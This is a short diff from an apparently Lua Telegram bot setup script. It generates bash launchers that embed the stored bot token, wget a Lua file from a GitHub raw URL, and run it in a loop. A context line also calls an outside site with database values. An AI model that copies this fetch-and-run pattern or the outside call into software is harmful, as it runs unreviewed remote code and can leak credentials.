@@ -68,10 +68,10 @@ http.request("http://tshake.ml/add/?id="..database:get(Server_Tshake.."Id_Tshake
 local RunTshake = io.open("Tshake", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
-cd $HOME/ve
+cd $HOME/Harley
 token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
 rm -fr Harley.lua
-wget "https://raw.githubusercontent.com/MdHaRleY/ve/master/Harley.lua"
+wget "https://raw.githubusercontent.com/MdHaRleY/Harley/master/Harley.lua"
 while(true) do
 rm -fr ../.telegram-cli
 ./tg -s ./Harley.lua -p PROFILE --bot=$token
@@ -81,7 +81,7 @@ RunTshake:close()
 local RunTs = io.open("ts", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/ve
+cd $HOME/Harley
 while(true) do
 rm -fr ../.telegram-cli
 screen -S Harley -X kill
